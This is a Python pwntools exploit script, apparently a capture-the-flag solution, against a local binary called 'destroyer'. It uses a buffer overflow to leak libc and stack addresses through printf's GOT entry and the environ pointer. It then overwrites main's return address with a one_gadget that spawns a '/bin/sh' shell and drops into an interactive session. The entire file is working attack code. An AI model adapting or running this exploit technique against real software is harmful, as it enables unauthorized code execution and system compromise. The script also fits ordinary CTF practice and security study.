from pwn import *
condition = True
context.log_level = "debug"
while(condition):
    p = process('./destroyer')
    e = ELF('./destroyer')
    libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
    printf_got = e.got['printf']
    environ_offset = libc.symbols['environ']
    printf_offset = libc.symbols['printf']
    one_gadget = 0x4f322
    # execve("/bin/sh", rsp+0x70, environ)
    p.sendlineafter("Name: ", "yee")

    payload = ""
    payload += 'a' * 40
    payload += p64(printf_got)
    p.recvuntil("PLAY")
    p.send(payload)
    p.recvuntil("FOR ")
    printf_libc = u64(p.recv(6).ljust(8, "\x00"))
    libc_base = printf_libc - printf_offset
    environ_libc = libc_base + environ_offset
    # Leak library base, environ ponter address
    p.recvuntil("\xe2\x95\xab")
    s1 = p.recv(1)
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s2 = p.recv(1)
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s3 = p.recv(1)

    if s1 == s2 == s3 :
        continue

    payload = ""
    payload += 'a' * 40
    payload += p64(environ_libc)
    p.recvuntil("PLAY")
    p.send(payload)
    print payload
    p.recvuntil("FOR ")
    stack_environ = u64(p.recv(6).ljust(8, "\x00"))
    stack_ret = stack_environ - 0xf0
    #Leak stack address in environ ptr
    p.recvuntil("\xe2\x95\xab")
    s1 = p.recv(1)
    
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s2 = p.recv(1)

    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s3 = p.recv(1)


    
    if s1 == s2 == s3 :
        continue
    payload = ""
    payload += 'a' * 40
    payload += p64(stack_ret)


    p.recvuntil("PLAY")
    p.send(payload)
    p.recvuntil("\xe2\x95\xab")
    s1 = p.recv(1)
    
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s2 = p.recv(1)
    s2
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s3 = p.recv(1)

    #Change buf value to main's return address

    if not(s1 == s2 == s3) :
        continue
    condition = False
print hex(stack_ret)
print hex(stack_environ)
payload = ""
payload += p64(libc_base+one_gadget)
print "jack Pot!!"


print p.recvuntil("again?")
p.send(payload)

print payload




p.interactive()



